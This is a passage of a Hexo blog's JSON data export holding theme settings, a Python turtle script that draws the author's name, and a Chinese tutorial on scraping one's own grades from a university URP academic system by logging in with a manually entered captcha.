l,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1728,"excerpt":"<p>今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。<br>咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。</p>","more":"<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> turtle <span class=\"keyword\">import</span> *</span><br><span class=\"line\">startx, starty = <span class=\"number\">-300</span>, <span class=\"number\">300</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">locate</span>(<span class=\"params\">x, y</span>):</span></span><br><span class=\"line\">    penup()</span><br><span class=\"line\">    goto(startx + x, starty - y)</span><br><span class=\"line\">    pendown()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw</span>(<span class=\"params\">angle, lenth</span>):</span></span><br><span class=\"line\">    seth(angle)</span><br><span class=\"line\">    forward(lenth)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    pensize(<span class=\"number\">6</span>)</span><br><span class=\"line\">    speed(<span class=\"number\">5</span>)</span><br><span class=\"line\">    pencolor(<span class=\"string\">&quot;red&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># G</span></span><br><span class=\"line\">    locate(<span class=\"number\">222</span>, <span class=\"number\">77</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">130</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">164</span>, <span class=\"number\">126</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">214</span>, <span class=\"number\">126</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">86</span>)</span><br><span class=\"line\">    <span class=\"comment\"># Y</span></span><br><span class=\"line\">    locate(<span class=\"number\">264</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">340</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">44</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">84</span>)</span><br><span class=\"line\">    <span class=\"comment\"># H</span></span><br><span class=\"line\">    locate(<span class=\"number\">384</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">400</span>, <span class=\"number\">128</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">48</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">460</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 郭</span></span><br><span class=\"line\">    locate(<span class=\"number\">78</span>, <span class=\"number\">285</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">40</span>, <span class=\"number\">305</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">350</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">46</span>, <span class=\"number\">364</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">38</span>, <span class=\"number\">402</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">130</span>, <span class=\"number\">304</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">130</span>, <span class=\"number\">304</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">46</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 永</span></span><br><span class=\"line\">    locate(<span class=\"number\">270</span>, <span class=\"number\">295</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">46</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">250</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">54</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">128</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">232</span>, <span class=\"number\">356</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">370</span>, <span class=\"number\">356</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 航</span></span><br><span class=\"line\">    locate(<span class=\"number\">438</span>, <span class=\"number\">286</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">428</span>, <span class=\"number\">312</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">428</span>, <span class=\"number\">312</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">446</span>, <span class=\"number\">328</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">414</span>, <span class=\"number\">363</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">446</span>, <span class=\"number\">383</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">34</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">515</span>, <span class=\"number\">286</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">478</span>, <span class=\"number\">310</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">498</span>, <span class=\"number\">342</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">108</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">498</span>, <span class=\"number\">342</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">106</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    hideturtle()</span><br><span class=\"line\">    done()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>面重点来了，字不重要，看图！！！<br><img data-src=\"https://cdn.file.todest.cn/pic/20200511.png\" alt=\"\"></p>"},{"title":"URP教务管理系统爬取成绩","date":"2019-07-06T13:53:46.000Z","abbrlink":"7c4a6922","_content":"# 页面\n**学期成绩**: `http://218.196.240.97/bxqcjcxAction.do`\n**历年成绩**: `http://218.196.240.97/gradeLnAllAction.do?oper=qbinfo`\n**方案成绩**: `http://218.196.240.97/gradeLnAllAction.do?oper=fainfo`\n**打印成绩**: `http://218.196.240.27/reportFiles/student/cj_zwcjd_all.jsp`\n<!--more-->\n# 过程\n>构建header\n\n```py\nheaders = {\n    'Accept': 'image/gif, image/jpeg, image/pjpeg,'\n              'application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3',\n    'Cache-Control': 'no-cache',\n    'Connection': 'Keep-Alive',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Referer': 'http://218.196.240.97/loginAction.do',\n    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;'\n                  '.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)'\n}\n```\n>构建表单\n\n```py\nform = {\n    'zjh': '',\n    'mm': '',\n    'v_yzm': '',\n}\n```\n>获取验证码\n\n```py\nsession = requests.session()\nreq = session.get(host + '/validateCodeAction.do')\ncookie = req.headers['Set-Cookie']\ncaptcha = open('tmp.jpg', 'wb')\ncaptcha.write(req.content)\ncaptcha.close()\n```\n>登录\n\n```py\nform['zjh'] = form['mm'] = input()\nform['v_yzm'] = input()\nos.remove('tmp.jpg')\nreq = session.post(host + '/loginAction.do', data=form, headers=headers)\n```\n>存为html\n\n```py\nreq = session.get(host + '/gradeLnAllAction.do?oper=qbinfo')\nsoup = BeautifulSoup(req.content,'lxml')\nsoup = soup.decode('utf-8')\nsoup = soup.replace('/css/newcss/','http://218.196.240.97/css/newcss/')\nfb = open('index.html','wb')\nfb.write(soup.encode('utf-8'))\nfb.close()\n```\n\n# 完整代码\n```py\nimport requests,os\nfrom PIL import Image\nfrom bs4 import BeautifulSoup\n\nhost = 'http://218.196.240.97'\n\nheaders = {\n    'Accept': 'image/gif, image/jpeg, image/pjpeg,'\n              'application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3',\n    'Cache-Control': 'no-cache',\n    'Connection': 'Keep-Alive',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Referer': 'http://218.196.240.97/loginAction.do',\n    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;'\n                  '.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)'\n}\n\nform = {\n    'zjh': '',\n    'mm': '',\n    'v_yzm': '',\n}\n\nsession = requests.session()\nreq = session.get(host + '/validateCodeAction.do')\ncookie = req.headers['Set-Cookie']\ncaptcha = open('tmp.jpg', 'wb')\ncaptcha.write(req.content)\ncaptcha.close()\n\n# form['zjh'] = input()\n# form['mm'] = input()\nform['zjh'] = form['mm'] = input()\nform['v_yzm'] = input()\nos.remove('tmp.jpg')\nreq = session.post(host + '/loginAction.do', data=form, headers=headers)\n\nreq = session.get(host + '/gradeLnAllAction.do?oper=qbinfo')\nsoup = BeautifulSoup(req.content,'lxml')\nsoup = soup.decode('utf-8')\nsoup = soup.replace('/css/newcss/','http://218.196.240.97/css/newcss/')\nfb = open('index.html','wb')\nfb.write(soup.encode('utf-8'))\nfb.close()\n```","source":"_posts/URP教务管理系统.md","raw":"---\ntitle: URP教务管理系统爬取成绩\ndate: 2019-07-06 21:53:46\ncategories:\n  - 编程语言\n  - Python\ntags: Python\nabbrlink: 7c4a6922\n---\n# 页面\n**学期成绩**: `http://218.196.240.97/bxqcjcxAction.do`\n**历年成绩**: `http://218.196.240.97/gradeLnAllAction.do?oper=qbinfo`\n**方案成绩**: `http://218.196.240.97/gradeLnAllAction.do?oper=fainfo`\n**打印成绩**: `http://218.196.240.27/reportFiles/student/cj_zwcjd_all.jsp`\n<!--more-->\n# 过程\n>构建header\n\n```py\nheaders = {\n    'Accept': 'image/gif, image/jpeg, image/pjpeg,'\n              'application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3',\n    'Cache-Control': 'no-cache',\n    'Connection': 'Keep-Alive',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Referer': 'http://218.196.240.97/loginAction.do',\n    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;'\n                  '.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)'\n}\n```\n>构建表单\n\n```py\nform = {\n    'zjh': '',\n    'mm': '',\n    'v_yzm': '',\n}\n```\n>获取验证码\n\n```py\nsession = requests.session()\nreq = session.get(host + '/validateCodeAction.do')\ncookie = req.headers['Set-Cookie']\ncaptcha = open('tmp.jpg', 'wb')\ncaptcha.write(req.content)\ncaptcha.close()\n```\n>登录\n\n```py\nform['zjh'] = form['mm'] = input()\nform['v_yzm'] = input()\nos.remove('tmp.jpg')\nreq = session.post(host + '/loginAction.do', data=form, headers=headers)\n```\n>存为html\n\n```py\nreq = session.get(host + '/gradeLnAllAction.do?oper=qbinfo')\nsoup = BeautifulSoup(req.content,'lxml')\nsoup = soup.decode('utf-8')\nsoup = soup.replace('/css/newcss/','http://218.196.240.97/css/newcss/')\nfb = open('index.html','wb')\nfb.write(soup.encode('utf-8'))\nfb.close()\n```\n\n# 完整代码\n```py\nimport requests,os\nfrom PIL import Image\nfrom bs4 import BeautifulSoup\n\nhost = 'http://218.196.240.97'\n\nheaders = {\n    'Accept': 'image/gif, image/jpeg, image/pjpeg,'\n              'application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*',\n    'Accept-Encoding': 'gzip, deflate',\n    'Accept-Language': 'zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3',\n    'Cache-Control': 'no-cache',\n    'Connection': 'Keep-Alive',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Referer': 'http://218.196.240.97/loginAction.do',\n    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;'\n                  '.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)'\n}\n\nform = {\n    'zjh': '',\n    'mm': '',\n    'v_yzm': '',\n}\n\nsession = requests.session()\nreq = session.get(host + '/validateCodeAction.do')\ncookie = req.headers['Set-Cookie']\ncaptcha = open('tmp.jpg', 'wb')\ncaptcha.write(req.content)\ncaptcha.close()\n\n# form['zjh'] = input()\n# form['mm'] = input()\nform['zjh'] = form['mm'] = input()\nform['v_yzm'] = input()\nos.remove('tmp.jpg')\nreq = session.post(host + '/loginAction.do', data=form, headers=headers)\n\nreq = session.get(host + '/gradeLnAllAction.do?oper=qbinfo')\nsoup = BeautifulSoup(req.content,'lxml')\nsoup = soup.decode('utf-8')\nsoup = soup.replace('/css/newcss/','http://218.196.240.97/css/newcss/')\nfb = open('index.html','wb')\nfb.write(soup.encode('utf-8'))\nfb.close()\n```","slug":"URP教务管理系统","published":1,"updated":"2020-05-11T09:42:05.705Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbx002kqse5e77kbeky","content":"<h1 id=\"页面\"><a href=\"#页面\" class=\"headerlink\" title=\"页面\"></a>页面</h1><p><strong>学期成绩</strong>: <code>http://218.196.240.97/bxqcjcxAction.do</code><br><strong>历年成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=qbinfo</code><br><strong>方案成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=fainfo</code><br><strong>打印成绩</strong>: <code>http://218.196.240.27/reportFiles/student/cj_zwcjd_all.jsp</code><br><a id=\"more\"></a></p>\n<h1 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h1><blockquote>\n<p>构建header</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class=\"line\">              <span class=\"string\">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Encoding&#x27;</span>: <span class=\"string\">&#x27;gzip, deflate&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cache-Control&#x27;</span>: <span class=\"string\">&#x27;no-cache&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;Keep-Alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Referer&#x27;</span>: <span class=\"string\">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>构建表单</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;zjh&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;mm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;v_yzm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>获取验证码</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">session = requests.session()</span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class=\"line\">cookie = req.headers[<span class=\"string\">&#x27;Set-Cookie&#x27;</span>]</span><br><span class=\"line\">captcha = open(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">captcha.write(req.content)</span><br><span class=\"line\">captcha.close()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>登录</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form[<span class=\"string\">&#x27;zjh&#x27;</span>] = form[<span class=\"string\">&#x27;mm&#x27;</span>] = input()</span><br><span class=\"line\">form[<span class=\"string\">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class=\"line\">os.remove(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>)</span><br><span class=\"line\">req = session.post(host + <span class=\"string\">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>存为html</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class=\"line\">soup = BeautifulSoup(req.content,<span class=\"string\">&#x27;lxml&#x27;</span>)</span><br><span class=\"line\">soup = soup.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">soup = soup.replace(<span class=\"string\">&#x27;/css/newcss/&#x27;</span>,<span class=\"string\">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class=\"line\">fb = open(<span class=\"string\">&#x27;index.html&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">fb.write(soup.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">fb.close()</span><br></pre></td></tr></table></figure>\n<h1 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h1><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 